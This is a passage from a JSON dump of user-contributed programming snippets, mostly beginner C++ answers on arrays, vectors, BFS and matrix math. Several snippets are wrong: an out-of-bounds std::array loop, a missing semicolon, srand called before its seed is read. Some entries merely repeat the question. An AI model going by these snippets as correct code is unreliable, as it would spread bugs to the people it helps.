6, 7, 8},         {1, 2, 3, 4, 5, 6, 7, 8},         {1, 2, 3, 4, 5, 6, 7, 8},         {1, 2, 3, 4, 5, 6, 7, 8}     };     make(result, source);     puts(\"Source:\");     print(source);     puts(\"Result:\");     print(result);     return 0; } </stdio.h>\n",
    "reg_date": "2021-10-12T11:36:29.000Z"
  },
  {
    "id": 56,
    "keyword": null,
    "link": null,
    "title": " 2d array of zeros c++",
    "description": "const int N = 10; int myarray[N][N] = {0};\n",
    "reg_date": "2021-10-12T11:36:29.000Z"
  },
  {
    "id": 57,
    "keyword": null,
    "link": null,
    "title": " 2d stl array",
    "description": "/* std::array is 1-dimensional, there is no such thing as a 2-dimensional std::array. You would simply have to use an inner std::array as the element type of an outer  std::array, eg: */ #include <iostream> #include <array>  int main(){   std::array<std::array<int,5>,4> myarray;   for (int i=0; i<5; i++){     for (int j=0; j<10; j++){       myarray[i].at(j) = j+1;         }   } } \n",
    "reg_date": "2021-10-12T11:36:29.000Z"
  },
  {
    "id": 58,
    "keyword": null,
    "link": null,
    "title": " 2d vector",
    "description": "// Create a vector containing n  //vectors of size m, all u=initialized with 0 vector<vector<int> > vec( n , vector<int> (m, 0));  \n#include <bits/stdc++.h> using namespace std; int main()  {   int rows = 2;   int cols = 2;   int val = 1;   vector< vector<int> > v(rows, vector<int> (cols, val));  /*creates 2d vector &ldquo;v[rows][cols]&rdquo; and initializes all elements to &ldquo;val == 1&rdquo; (default value is 0)*/   v[0][0] = 5;   v[1][1] = 4;   cout << v[0][0] << endl; //Output: 5cout << v[1][0] << endl; //Output: 1return 0;}\n#include <bits/stdc++.h> using namespace std; main() { \tint r=2,c=3,val=1; \tvector<vector<int>> v(r,vector<int>(c,val));  \t/*     2d vector &ldquo;v[r][c]&rdquo;;     all elements = val;      (default value is 0)     */ \tfor(int i=0;i<r;i++)  \t\tfor(int j=0;j<c;j++)    \t\t\tcout<<v[i][j]<<\" \";         cout<<endl;   \t/*     1 1 1     1 1 1     */ }\n// Initializing 2D vector \"vect\" with  // values  vector<vector<int> > vect{ { 1, 2, 3 },                             { 4, 5, 6 },                             { 7, 8, 9 } }; \nvector<vector<int>> v(row,vector<int>(col,val));\n",
    "reg_date": "2021-10-12T11:36:29.000Z"
  },
  {
    "id": 59,
    "keyword": null,
    "link": null,
    "title": " 2d vector c++ declaration",
    "description": "vector< vector<int>> a(rows, vector<int> (cols));\nvector<vector<int>> vec(N, vector<int> (M, INT_MAX));  Explanation:: vector<vector<int>> -- will take the formed container N -- Think like row of 2d Matrix vector<int> (M, INT_MAX) -- In each row, there is again a vector associated with it,  that will formed 2d array.\nmyVector[   Vector[0, 4, 2, 5],   Vector[1, 4, 2] ];  /*When you call for myVector[1].size() it would return 3 and [0] would return 4.  For the amount of rows (int vectors) in the 2d vector, you can just use myVector.size()  You can run this to see it in actions*/\n",
    "reg_date": "2021-10-12T11:36:29.000Z"
  },
  {
    "id": 60,
    "keyword": null,
    "link": null,
    "title": " 2d vector print",
    "description": "for(auto lst : vec){   for(auto e : lst){   \tcout<<e<<\" \";   }   cout<<endl; }\t\n\tfor(int i=0; i<v.size(); i++)  \t\tfor(int j=0; j<v[i].size(); j++)    \t\t\tcout<<v[i][j]<<\" \";         cout<<endl;\n// A recursive function able to print a vector // of an arbitrary amount of dimensions. template<typename T> static void show(T vec) {   std::cout << vec; }   template<typename T> static void show(std::vector<T> vec) {   int size = vec.size();   if (size <= 0) {     std::cout << \"invalid vector\";     return;   }   std::cout << '{';   for (int l = 0; l < size - 1; l++) {     show(vec[l]);     std::cout << ',';   }   show(vec[size - 1]);   std::cout << '}'; }\n",
    "reg_date": "2021-10-12T11:36:29.000Z"
  },
  {
    "id": 61,
    "keyword": null,
    "link": null,
    "title": " 2d vector push back",
    "description": "std::vector<std::vector<int>> normal; for(int i=0; i<10; i++) {   \t//push a vector each time you loop a row     normal.push_back(std::vector<int>());     for(int j=0; j<20; j++)     {       \t//push an item each time you loop a column         normal[i].push_back(j);         } }\n",
    "reg_date": "2021-10-12T11:36:30.000Z"
  },
  {
    "id": 62,
    "keyword": null,
    "link": null,
    "title": " 2d vector pusph back",
    "description": "std::vector<std::vector<int>> normal; for(int i=0; i<10; i++) {   \t//push a vector each time you loop a row     normal.push_back(std::vector<int>());     for(int j=0; j<20; j++)     {       \t//push an item each time you loop a column         normal[i].push_back(j);         } }\n",
    "reg_date": "2021-10-12T11:36:30.000Z"
  },
  {
    "id": 63,
    "keyword": null,
    "link": null,
    "title": " 2s complement c++",
    "description": "//Program to find two's complement of a binary number #include <iostream>  #define size 6 using namespace std;  int main() {   char binary[size + 1], one[size + 1], two[size + 1];   int i, carry = 1, fail = 0;   cout << \" Input a \" << size << \" bit binary number: \";   cin >> binary;   for (i = 0; i < size; i++) {     if (binary[i] == '1') {       one[i] = '0';     } else if (binary[i] == '0') {       one[i] = '1';     } else {       cout << \"Error! Input the number of assigned bits.\" << endl;       fail = 1;       break;     }   }   one[size] = '\\0';    for (i = size - 1; i >= 0; i--) {     if (one[i] == '1' && carry == 1) {       two[i] = '0';     } else if (one[i] == '0' && carry == 1) {       two[i] = '1';       carry = 0;     } else {       two[i] = one[i];     }   }   two[size] = '\\0';   if (fail == 0) {     cout << \" The original binary = \" << binary << endl;     cout << \" After ones complement the value = \" << one << endl;     cout << \" After twos complement the value = \" << two << endl;   } }Copy\n",
    "reg_date": "2021-10-12T11:36:30.000Z"
  },
  {
    "id": 64,
    "keyword": null,
    "link": null,
    "title": " 3. The method indexOf, part of the List interface, returns the index of the first occurrence of an object in a List. What does the following code fragment do?",
    "description": "int indexOfSam = myList.indexOf(\"Sam\");  ListIterator<String> iteratorToSam = myListlistIterator(indexOfSam);  iteratorToSam.previous();  iteratorToSam.remove();  \n",
    "reg_date": "2021-10-12T11:36:30.000Z"
  },
  {
    "id": 65,
    "keyword": null,
    "link": null,
    "title": " 3 conditions for a while loop c++",
    "description": "// for each iteration, test three conditions      while (small < large && large > 0 && small < MAXSMALL)      {          std::cout << \".\";          small++;          large-=2;      }\n",
    "reg_date": "2021-10-12T11:36:30.000Z"
  },
  {
    "id": 66,
    "keyword": null,
    "link": null,
    "title": " 3 dimensional array",
    "description": "// Two dimensional array int a[2][3]= {         {1, 2, 3},         {4, 5, 6}     };          cout << a[1][1]; // Output is 5  // Three dimensional array //[2] is elements; [3] is rows in elements; [4] is column in elemnents  int a[2][3][2]= {         //Element 0         { {1, 2},            {2, 3},            {4, 5}                       },                           // Element 1         { {6, 7},            {8, 9},            {10, 11}                       }     };          cout << a[0][1][1]; // Prints 3\nint test[2][3][4] = {     {{3, 4, 2, 3}, {0, -3, 9, 11}, {23, 12, 23, 2}},     {{13, 4, 56, 3}, {5, 9, 3, 5}, {3, 1, 4, 9}}}\n",
    "reg_date": "2021-10-12T11:36:30.000Z"
  },
  {
    "id": 67,
    "keyword": null,
    "link": null,
    "title": " 3d array in c++",
    "description": "//[2] is elements; [3] is rows in elements; [4] is column in elemnents  int a[2][3][2]= {         //Element 0         { {1, 2},            {2, 3},            {4, 5}                       },                           // Element 1         { {6, 7},            {8, 9},            {10, 11}                       }     };          cout << a[0][1][1]; // Prints 3\n#include <array> 2 #include <iostream> 3 4 using namespace std; 5 6 //remember const! 7 const int ROWS = 2; 8 const int COLS = 3; 9 10 void printMatrix(array<array<int, COLS>, ROWS> matrix){ 11 //for each row 12 for (int row = 0; row < matrix.size(); ++row){ 13 //for each element in the current row 14 for (int col = 0; col < matrix[row].size(); ++col){ 15 cout << matrix[row][col] << ' '; 16 } 17 cout << endl; 18 } 19 }\nvoid printMatrix(array<array<int, COLS>, ROWS> matrix){ for (auto row : matrix){ //auto infers that row is of type array<int, COLS> for (auto element : row){ cout << element << ' '; } cout << endl; }\n",
    "reg_date": "2021-10-12T11:36:30.000Z"
  },
  {
    "id": 68,
    "keyword": null,
    "link": null,
    "title": " 3d projection onto 2d plane algorithm",
    "description": "#include <vector> #include <cmath> #include <stdexcept> #include <algorithm>  struct Vector {     Vector() : x(0),y(0),z(0),w(1){}     Vector(float a, float b, float c) : x(a),y(b),z(c),w(1){}      /* Assume proper operator overloads here, with vectors and scalars */     float Length() const     {         return std::sqrt(x*x + y*y + z*z);     }          Vector Unit() const     {         const float epsilon = 1e-6;         float mag = Length();         if(mag < epsilon){             std::out_of_range e(\"\");             throw e;         }         return *this / mag;     } };  inline float Dot(const Vector& v1, const Vector& v2) {     return v1.x*v2.x + v1.y*v2.y + v1.z*v2.z; }  class Matrix {     public:     Matrix() : data(16)     {         Identity();     }     void Identity()     {         std::fill(data.begin(), data.end(), float(0));         data[0] = data[5] = data[10] = data[15] = 1.0f;     }     float& operator[](size_t index)     {         if(index >= 16){             std::out_of_range e(\"\");             throw e;         }         return data[index];     }     Matrix operator*(const Matrix& m) const     {         Matrix dst;         int col;         for(int y=0; y<4; ++y){             col = y*4;             for(int x=0; x<4; ++x){                 for(int i=0; i<4; ++i){                     dst[x+col] += m[i+col]*data[x+i*4];                 }             }         }         return dst;     }     Matrix& operator*=(const Matrix& m)     {         *this = (*this) * m;         return *this;     }      /* The interesting stuff */     void SetupClipMatrix(float fov, float aspectRatio, float near, float far)     {         Identity();         float f = 1.0f / std::tan(fov * 0.5f);         data[0] = f*aspectRatio;         data[5] = f;         data[10] = (far+near) / (far-near);         data[11] = 1.0f; /* this 'plugs' the old z into w */         data[14] = (2.0f*near*far) / (near-far);         data[15] = 0.0f;     }      std::vector<float> data; };  inline Vector operator*(const Vector& v, const Matrix& m) {     Vector dst;     dst.x = v.x*m[0] + v.y*m[4] + v.z*m[8 ] + v.w*m[12];     dst.y = v.x*m[1] + v.y*m[5] + v.z*m[9 ] + v.w*m[13];     dst.z = v.x*m[2] + v.y*m[6] + v.z*m[10] + v.w*m[14];     dst.w = v.x*m[3] + v.y*m[7] + v.z*m[11] + v.w*m[15];     return dst; }  typedef std::vector<Vector> VecArr; VecArr ProjectAndClip(int width, int height, float near, float far, const VecArr& vertex) {     float halfWidth = (float)width * 0.5f;     float halfHeight = (float)height * 0.5f;     float aspect = (float)width / (float)height;     Vector v;     Matrix clipMatrix;     VecArr dst;     clipMatrix.SetupClipMatrix(60.0f * (M_PI / 180.0f), aspect, near, far);     /*  Here, after the perspective divide, you perform Sutherland-Hodgeman clipping          by checking if the x, y and z components are inside the range of [-w, w].         One checks each vector component seperately against each plane. Per-vertex         data like colours, normals and texture coordinates need to be linearly         interpolated for clipped edges to reflect the change. If the edge (v0,v1)         is tested against the positive x plane, and v1 is outside, the interpolant         becomes: (v1.x - w) / (v1.x - v0.x)         I skip this stage all together to be brief.     */     for(VecArr::iterator i=vertex.begin(); i!=vertex.end(); ++i){         v = (*i) * clipMatrix;         v /= v.w; /* Don't get confused here. I assume the divide leaves v.w alone.*/         dst.push_back(v);     }      /* TODO: Clipping here */      for(VecArr::iterator i=dst.begin(); i!=dst.end(); ++i){         i->x = (i->x * (float)width) / (2.0f * i->w) + halfWidth;         i->y = (i->y * (float)height) / (2.0f * i->w) + halfHeight;     }     return dst; } \n",
    "reg_date": "2021-10-12T11:36:30.000Z"
  },
  {
    "id": 69,
    "keyword": null,
    "link": null,
    "title": " 3d vector c++ resize",
    "description": "dp.resize(n+1,vector<vector<int>>(n+1,vector<int>(n+1,-1))); \nstd::vector<int> vec = {1, 2, 3}; vec.resize(2); // {1, 2} vec.resize(4); // {1, 2, 0, 0,} vec.resize(6, 9);  // {1, 2, 0, 0, 9, 9}\nresize (size_type n, const value_type& val);  The resize() method (and passing argument to constructor is equivalent to that)    will insert or delete appropriate number of elements to the vector to make it  given size (it has optional second argument to specify their value). \n",
    "reg_date": "2021-10-12T11:36:30.000Z"
  },
  {
    "id": 70,
    "keyword": null,
    "link": null,
    "title": " 3x3 matrix multiplication in c++",
    "description": "#include <iostream> using namespace std;  int main() {     int a[10][10], b[10][10], mult[10][10], r1, c1, r2, c2, i, j, k;      cout << \"Enter rows and columns for first matrix: \";     cin >> r1 >> c1;     cout << \"Enter rows and columns for second matrix: \";     cin >> r2 >> c2;      // If column of first matrix in not equal to row of second matrix,     // ask the user to enter the size of matrix again.     while (c1!=r2)     {         cout << \"Error! column of first matrix not equal to row of second.\";          cout << \"Enter rows and columns for first matrix: \";         cin >> r1 >> c1;          cout << \"Enter rows and columns for second matrix: \";         cin >> r2 >> c2;     }      // Storing elements of first matrix.     cout << endl << \"Enter elements of matrix 1:\" << endl;     for(i = 0; i < r1; ++i)         for(j = 0; j < c1; ++j)         {             cout << \"Enter element a\" << i + 1 << j + 1 << \" : \";             cin >> a[i][j];         }      // Storing elements of second matrix.     cout << endl << \"Enter elements of matrix 2:\" << endl;     for(i = 0; i < r2; ++i)         for(j = 0; j < c2; ++j)         {             cout << \"Enter element b\" << i + 1 << j + 1 << \" : \";             cin >> b[i][j];         }      // Initializing elements of matrix mult to 0.     for(i = 0; i < r1; ++i)         for(j = 0; j < c2; ++j)         {             mult[i][j]=0;         }      // Multiplying matrix a and b and storing in array mult.     for(i = 0; i < r1; ++i)         for(j = 0; j < c2; ++j)             for(k = 0; k < c1; ++k)             {                 mult[i][j] += a[i][k] * b[k][j];             }      // Displaying the multiplication of two matrix.     cout << endl << \"Output Matrix: \" << endl;     for(i = 0; i < r1; ++i)     for(j = 0; j < c2; ++j)     {         cout << \" \" << mult[i][j];         if(j == c2-1)             cout << endl;     }      return 0; } \n3 3 3 3 3 3\n",
    "reg_date": "2021-10-12T11:36:31.000Z"
  },
  {
    "id": 71,
    "keyword": null,
    "link": null,
    "title": " 400 watt hour per kg",
    "description": "1 440 000 m2 / s2\n",
    "reg_date": "2021-10-12T11:36:31.000Z"
  },
  {
    "id": 72,
    "keyword": null,
    "link": null,
    "title": " 4 queens backtracking in cpp",
    "description": "void nQueen(int row,int n){     //if all queens are placed     if(row>=n){         cout<<\"Solution: \";          print_queens(n);         cout<<endl;         return;     }     for(int col=0;col<n;col++){                  if (check(ar,row,col,n)){             ar[row][col]=1;              //to place next queen in the next row             nQueen(row+1,n);             ar[row][col]=0; //backtrack                      }else{                          cout<<\"Backtracking from node: \";             print_queens(n);             cout<<col+1<<endl;                      }      } }  \n",
    "reg_date": "2021-10-12T11:36:31.000Z"
  },
  {
    "id": 73,
    "keyword": null,
    "link": null,
    "title": " 51 13 C:\\Users\\usuario\\Documents\\Destajo 1.cpp [Error] 'gotoxy' was not declared in this scope",
    "description": "51\t13\tC:\\Users\\usuario\\Documents\\Destajo 1.cpp\t[Error] 'gotoxy' was not declared in this scope\n",
    "reg_date": "2021-10-12T11:36:31.000Z"
  },
  {
    "id": 74,
    "keyword": null,
    "link": null,
    "title": " 64 bit unsigned integer c++",
    "description": "uint64_t\n",
    "reg_date": "2021-10-12T11:36:31.000Z"
  },
  {
    "id": 75,
    "keyword": null,
    "link": null,
    "title": " 8085 microprocessor different simulators support for windows 10 64 bit",
    "description": "8085 microprocessor different simulators support for windows 10 64 bit \n",
    "reg_date": "2021-10-12T11:36:31.000Z"
  },
  {
    "id": 76,
    "keyword": null,
    "link": null,
    "title": " 9+20",
    "description": "The answer is 29\n",
    "reg_date": "2021-10-12T11:36:31.000Z"
  },
  {
    "id": 77,
    "keyword": null,
    "link": null,
    "title": " A[12] = h + A[8]",
    "description": "# Not sure what to do now? Enter your mips code here \n",
    "reg_date": "2021-10-12T11:36:31.000Z"
  },
  {
    "id": 78,
    "keyword": null,
    "link": null,
    "title": " A. Cheap Travel",
    "description": "#include <iostream>#include <math.h> using namespace std; int main(){    int n, m, a, b;        cin >> n >> m >> a >> b;    if (m * a <= b)        cout << n * a << \"\\n\";    else         cout << (n/m) * b + min((n%m) * a, b) << \"\\n\";     return 0;}\n",
    "reg_date": "2021-10-12T11:36:31.000Z"
  },
  {
    "id": 79,
    "keyword": null,
    "link": null,
    "title": " ALO",
    "description": "#include<iostream> using namespace std;  int main(){ \tcout << \"My name is Vu\" }\n",
    "reg_date": "2021-10-12T11:36:32.000Z"
  },
  {
    "id": 80,
    "keyword": null,
    "link": null,
    "title": " Add Two Numbers",
    "description": "# This program adds two numbers  num1 = 1.5 num2 = 6.3  # Add two numbers sum = float(num1) + float(num2)  # Display the sum print('The sum of {0} and {1} is {2}'.format(num1, num2, sum)) \n// program to add two numbers using a function  #include <iostream>  using namespace std;  // declaring a function int add(int a, int b) {     return (a + b); }  int main() {      int sum;          // calling the function and storing     // the returned value in sum     sum = add(100, 78);      cout << \"100 + 78 = \" << sum << endl;      return 0; }\n",
    "reg_date": "2021-10-12T11:36:32.000Z"
  },
  {
    "id": 81,
    "keyword": null,
    "link": null,
    "title": " All data types in C++",
    "description": " \t\t\t\t\t\t  Data types in c++ \tBuilt-in                User Defined            Derived     ----------              -----------             ------------     void, int,\t\t\t    structure,              array, \tchar, float,\t\t    union,\t\t\t\t\tfunction,     double, bool,\t\t    enum,\t\t\t\t\tpointer,     long long\t\t\t    class,\t\t\t\t\treference     Wide Character\t\t    typedef\nLong Data Type\t          Size             (in bytes)\tRange long int\t            4\t         -2,147,483,648 to 2,147,483,647 unsigned long int\t    4\t         0 to 4,294,967,295 long long int\t        8\t         -(2^63) to (2^63)-1 unsigned long long int\t8\t         0 to 18,446,744,073,709,551,615\nData Type \t\t\t\t\t\t\t\t\t\tSize int (Integer) = 5, 6, 7\t\t\t\t\t\t\t2 float (Floating Value) = -3.67, 2.67\t\t\t4 double (Double of float) = -7.8746\t\t\t\t8 char (Character) = \t'a', 'b', 'A'\t\t\t\t1 string (Multiple chars) = \"Hello World\" \t\tNo of Chars bool (Boolean) = true, false\t\t\t\t\ttrue = 1, false = 0\nint myNum = 5;               // Integer (whole number) float myFloatNum = 5.99;     // Floating point number double myDoubleNum = 9.98;   // Floating point number char myLetter = 'D';         // Character bool myBoolean = true;       // Boolean string myText = \"Hello\";     // String\n",
    "reg_date": "2021-10-12T11:36:32.000Z"
  },
  {
    "id": 82,
    "keyword": null,
    "link": null,
    "title": " Anagram",
    "description": "def isAnagram(A,B):   if sorted(A) == sorted(B):     print(\"Yes\")   else:     print(\"No\") isAnagram(\"earth\",\"heart\") #Output: Yes  #Hope this helps:)\n#take user input String1 = input('Enter the 1st string :') String2 = input('Enter the 2nd string :') #check if length matches if len(String1) != len(String2):     #if False     print('Strings are not anagram') else:     #sorted function sort string by characters     String1 = sorted(String1)     String2 = sorted(String2)     #check if now strings matches     if String1 == String2:         #if True         print('Strings are anagram')     else:          print('Strings are not anagram')\nconst anagram = (str1, str2) => {     return str1.toLowerCase().split('').sort().join('') === str2.toLowerCase().split('').sort().join(''); };  let test = anagram('Regallager', 'Lagerregal'); console.log(test);\n",
    "reg_date": "2021-10-12T11:36:32.000Z"
  },
  {
    "id": 83,
    "keyword": null,
    "link": null,
    "title": " Anonymous Object in C++",
    "description": "#include <iostream>   using namespace std;   class A {     public: A() //   constructor       {         cout << \"Constructor executed\" << endl;     }~A() // Destructor        {         cout << \"Destructor executed\" << endl;     } }; int main() {     A(); // calling constructor     A(); // calling constructor }\n",
    "reg_date": "2021-10-12T11:36:32.000Z"
  },
  {
    "id": 84,
    "keyword": null,
    "link": null,
    "title": " Appending a vector to a vector in C++",
    "description": "Input:     vector<int> v1{ 10, 20, 30, 40, 50 };     vector<int> v2{ 100, 200, 300, 400 };      //appending elements of vector v2 to vector v1     v1.insert(v1.end(), v2.begin(), v2.end());      Output:     v1: 10 20 30 40 50 100 200 300 400     v2: 100 200 300 400\n",
    "reg_date": "2021-10-12T11:36:32.000Z"
  },
  {
    "id": 85,
    "keyword": null,
    "link": null,
    "title": " Application of c++ in youtube program",
    "description": "Application of c++ in youtube program\n",
    "reg_date": "2021-10-12T11:36:33.000Z"
  },
  {
    "id": 86,
    "keyword": null,
    "link": null,
    "title": " Arduino Sring to const char",
    "description": "const char* txt = strstr( stringOne.c_str(), \"]\" );\n",
    "reg_date": "2021-10-12T11:36:33.000Z"
  },
  {
    "id": 87,
    "keyword": null,
    "link": null,
    "title": " Area of a Circle in C++ Programming",
    "description": "#include <iostream> #include <iomanip> using namespace std;  int main(){     double R,A;     cin >> R;     A = 3.14159 * R * R;     cout << \"A=\" << fixed << setprecision(4) << A << endl;     return 0; }\n",
    "reg_date": "2021-10-12T11:36:33.000Z"
  },
  {
    "id": 88,
    "keyword": null,
    "link": null,
    "title": " Arrays hackerrank solution in c++",
    "description": "#include <cmath> #include <cstdio> #include <vector> #include <iostream> #include <algorithm> using namespace std;   int main() {     /* Enter your code here. Read input from STDIN. Print output to STDOUT */       int n,i=0;     cin>>n;     int *a = new int[n];     while(cin>>a[i++]);     while(cout<<a[--n]<<' '&& n);     delete[] a;      return 0; } \n",
    "reg_date": "2021-10-12T11:36:33.000Z"
  },
  {
    "id": 89,
    "keyword": null,
    "link": null,
    "title": " Ascending order of three number without using Loop in c++",
    "description": "#include<iostream>#include <conio.h>using namespace std;int main (){    int n1,n2,n3;    cout <<\"Enter numbers.\\n\";    cout<<\" first number=\";    cin>>n1;    cout<<\"second number=\";    cin >> n2;    cout <<\"third number=\";    cin >>n3;    if (n1<n2 && n1<n3)    cout <<n1<<\"less than\"<<n2    <<\" and\"<<n3;    if (n2<n1 && n2<n3)    cout <<n2<<\"less than\"    <<n3<<\" and \"<<n1;    if (n3<n1 && n3 <n2)    cout <<n3<<\" less than \"    <<n1<< \" and \"<<n2;    return 0;    getch (); }\n",
    "reg_date": "2021-10-12T11:36:33.000Z"
  },
  {
    "id": 90,
    "keyword": null,
    "link": null,
    "title": " Assigning a seed on a random number generator in C++",
    "description": "//Decalare a variable to be used as a seed. int seed; //variable name seed is declared //Assign the decalred variable \"seed\" to be a seed for the random number generator.  srand(seed); //Prompt user to enter a seed cout<<\"Enter a seed variable \"<< endl; cin >> seed;  \n",
    "reg_date": "2021-10-12T11:36:33.000Z"
  },
  {
    "id": 91,
    "keyword": null,
    "link": null,
    "title": " Association, aggregation composition in C++ example",
    "description": "Association, aggregation composition in C++ example \n",
    "reg_date": "2021-10-12T11:36:33.000Z"
  },
  {
    "id": 92,
    "keyword": null,
    "link": null,
    "title": " BAPS",
    "description": "www.baps.org  The BAPS Swaminarayan Sanstha is a spiritual, volunteer-driven organization  dedicated to improving society through individual growth by fostering  the Hindu ideals of faith, unity, and selfless service.\n",
    "reg_date": "2021-10-12T11:36:33.000Z"
  },
  {
    "id": 93,
    "keyword": null,
    "link": null,
    "title": " BFS c",
    "description": "// BFS algorithm in C  #include <stdio.h> #include <stdlib.h> #define SIZE 40  struct queue {   int items[SIZE];   int front;   int rear; };  struct queue* createQueue(); void enqueue(struct queue* q, int); int dequeue(struct queue* q); void display(struct queue* q); int isEmpty(struct queue* q); void printQueue(struct queue* q);  struct node {   int vertex;   struct node* next; };  struct node* createNode(int);  struct Graph {   int numVertices;   struct node** adjLists;   int* visited; };  // BFS algorithm void bfs(struct Graph* graph, int startVertex) {   struct queue* q = createQueue();    graph->visited[startVertex] = 1;   enqueue(q, startVertex);    while (!isEmpty(q)) {     printQueue(q);     int currentVertex = dequeue(q);     printf(\"Visited %d\\n\", currentVertex);      struct node* temp = graph->adjLists[currentVertex];      while (temp) {       int adjVertex = temp->vertex;        if (graph->visited[adjVertex] == 0) {         graph->visited[adjVertex] = 1;         enqueue(q, adjVertex);       }       temp = temp->next;     }   } }  // Creating a node struct node* createNode(int v) {   struct node* newNode = malloc(sizeof(struct node));   newNode->vertex = v;   newNode->next = NULL;   return newNode; }  // Creating a graph struct Graph* createGraph(int vertices) {   struct Graph* graph = malloc(sizeof(struct Graph));   graph->numVertices = vertices;    graph->adjLists = malloc(vertices * sizeof(struct node*));   graph->visited = malloc(vertices * sizeof(int));    int i;   for (i = 0; i < vertices; i++) {     graph->adjLists[i] = NULL;     graph->visited[i] = 0;   }    return graph; }  // Add edge void addEdge(struct Graph* graph, int src, int dest) {   // Add edge from src to dest   struct node* newNode = createNode(dest);   newNode->next = graph->adjLists[src];   graph->adjLists[src] = newNode;    // Add edge from dest to src   newNode = createNode(src);   newNode->next = graph->adjLists[dest];   graph->adjLists[dest] = newNode; }  // Create a queue struct queue* createQueue() {   struct queue* q = malloc(sizeof(struct queue));   q->front = -1;   q->rear = -1;   return q; }  // Check if the queue is empty int isEmpty(struct queue* q) {   if (q->rear == -1)     return 1;   else     return 0; }  // Adding elements into queue void enqueue(struct queue* q, int value) {   if (q->rear == SIZE - 1)     printf(\"\\nQueue is Full!!\");   else {     if (q->front == -1)       q->front = 0;     q->rear++;     q->items[q->rear] = value;   } }  // Removing elements from queue int dequeue(struct queue* q) {   int item;   if (isEmpty(q)) {     printf(\"Queue is empty\");     item = -1;   } else {     item = q->items[q->front];     q->front++;     if (q->front > q->rear) {       printf(\"Resetting queue \");       q->front = q->rear = -1;     }   }   return item; }  // Print the queue void printQueue(struct queue* q) {   int i = q->front;    if (isEmpty(q)) {     printf(\"Queue is empty\");   } else {     printf(\"\\nQueue contains \\n\");     for (i = q->front; i < q->rear + 1; i++) {       printf(\"%d \", q->items[i]);     }   } }  int main() {   struct Graph* graph = createGraph(6);   addEdge(graph, 0, 1);   addEdge(graph, 0, 2);   addEdge(graph, 1, 2);   addEdge(graph, 1, 4);   addEdge(graph, 1, 3);   addEdge(graph, 2, 4);   addEdge(graph, 3, 4);    bfs(graph, 0);    return 0; }\n#include<stdio.h> #include<stdlib.h>   #define MAX 100     #define initial 1 #define waiting 2 #define visited 3   int n;     int adj[MAX][MAX]; int state[MAX];  void create_graph(); void BF_Traversal(); void BFS(int v);   int queue[MAX], front = -1,rear = -1; void insert_queue(int vertex); int delete_queue(); int isEmpty_queue();   int main() { \tcreate_graph(); \tBF_Traversal(); \treturn 0; }   void BF_Traversal() { \tint v; \t \tfor(v=0; v<n; v++)  \t\tstate[v] = initial; \t \tprintf(\"Enter Start Vertex for BFS: \\n\"); \tscanf(\"%d\", &v); \tBFS(v); }   void BFS(int v) { \tint i; \t \tinsert_queue(v); \tstate[v] = waiting; \t \twhile(!isEmpty_queue()) \t{ \t\tv = delete_queue( ); \t\tprintf(\"%d \",v); \t\tstate[v] = visited; \t\t \t\tfor(i=0; i<n; i++) \t\t{ \t\t\tif(adj[v][i] == 1 && state[i] == initial)  \t\t\t{ \t\t\t\tinsert_queue(i); \t\t\t\tstate[i] = waiting; \t\t\t} \t\t} \t} \tprintf(\"\\n\"); }   void insert_queue(int vertex) { \tif(rear == MAX-1) \t\tprintf(\"Queue Overflow\\n\"); \telse \t{ \t\tif(front == -1)  \t\t\tfront = 0; \t\trear = rear+1; \t\tqueue[rear] = vertex ; \t} }   int isEmpty_queue() { \tif(front == -1 || front > rear) \t\treturn 1; \telse \t\treturn 0; }   int delete_queue() { \tint delete_item; \tif(front == -1 || front > rear) \t{ \t\tprintf(\"Queue Underflow\\n\"); \t\texit(1); \t} \t \tdelete_item = queue[front]; \tfront = front+1; \treturn delete_item; }   void create_graph() { \tint count,max_edge,origin,destin;   \tprintf(\"Enter number of vertices : \"); \tscanf(\"%d\",&n); \tmax_edge = n*(n-1);   \tfor(count=1; count<=max_edge; count++) \t{ \t\tprintf(\"Enter edge %d( -1 -1 to quit ) : \",count); \t\tscanf(\"%d %d\",&origin,&destin);   \t\tif((origin == -1) && (destin == -1)) \t\t\tbreak;   \t\tif(origin>=n || destin>=n || origin<0 || destin<0) \t\t{ \t\t\tprintf(\"Invalid edge!\\n\"); \t\t\tcount--; \t\t} \t\telse \t\t{ \t\t\tadj[origin][destin] = 1; \t\t} \t} } \n",
    "reg_date": "2021-10-12T11:36:33.000Z"
  },
  {
    "id": 94,
    "keyword": null,
    "link": null,
    "title": " BFS in c++",
    "description": "#include<iostream> #include <list>   using namespace std;     class Graph {     int V;             list<int> *adj;    public:     Graph(int V);              void addEdge(int v, int w);             void BFS(int s);   };   Graph::Graph(int V) {     this->V = V;     adj = new list<int>[V]; }   void Graph::addEdge(int v, int w) {     adj[v].push_back(w);  }   void Graph::BFS(int s) {        bool *visited = new bool[V];     for(int i = 0; i < V; i++)         visited[i] = false;           list<int> queue;           visited[s] = true;     queue.push_back(s);           list<int>::iterator i;       while(!queue.empty())     {                 s = queue.front();         cout << s << \" \";         queue.pop_front();                  for (i = adj[s].begin(); i != adj[s].end(); ++i)         {             if (!visited[*i])             {                 visited[*i] = true;                 queue.push_back(*i);             }         }     } }    int main() {          Graph g(4);     g.addEdge(0, 1);     g.addEdge(0, 2);     g.addEdge(1, 2);     g.addEdge(2, 0);     g.addEdge(2, 3);     g.addEdge(3, 3);       cout << \"Following is Breadth First Traversal \"          << \"(starting from vertex 2) \\n\";     g.BFS(2);       return 0; }\n",
    "reg_date": "2021-10-12T11:36:33.000Z"
  },
  {
    "id": 95,
    "keyword": null,
    "link": null,
    "title": " BOLD FONT in c++",
    "description": "// C++ implementation for  // settextstyle() function  #include <graphics.h>   // driver code  int main()  {  \t// gm is Graphics mode which is  \t// a computer display mode that  \t// generates image using pixels.  \t// DETECT is a macro defined in  \t// \"graphics.h\" header file  \tint gd = DETECT, gm;   \t// initgraph initializes the  \t// graphics system by loading  \t// a graphics driver from disk  \tinitgraph(&gd, &gm, \"\");   \t// location of text  \tint x = 150;  \tint y = 150;   \t// font style  \tint font = 8;   \t// font direction  \tint direction = 0;   \t// font size  \tint font_size = 5;   \t// for setting text style  \tsettextstyle(font, direction, font_size);   \t// for printing text in graphics window  \touttextxy(x, y, \"Geeks For Geeks\");   \tgetch();  \t \t// closegraph function closes the  \t// graphics mode and deallocates  \t// all memory allocated by graphics  \t// system .  \tclosegraph();  \t \treturn 0;  }  //author: @Zenonymous\n",
    "reg_date": "2021-10-12T11:36:34.000Z"
  },
  {
    "id": 96,
    "keyword": null,
    "link": null,
    "title": " Basic Makefile C++",
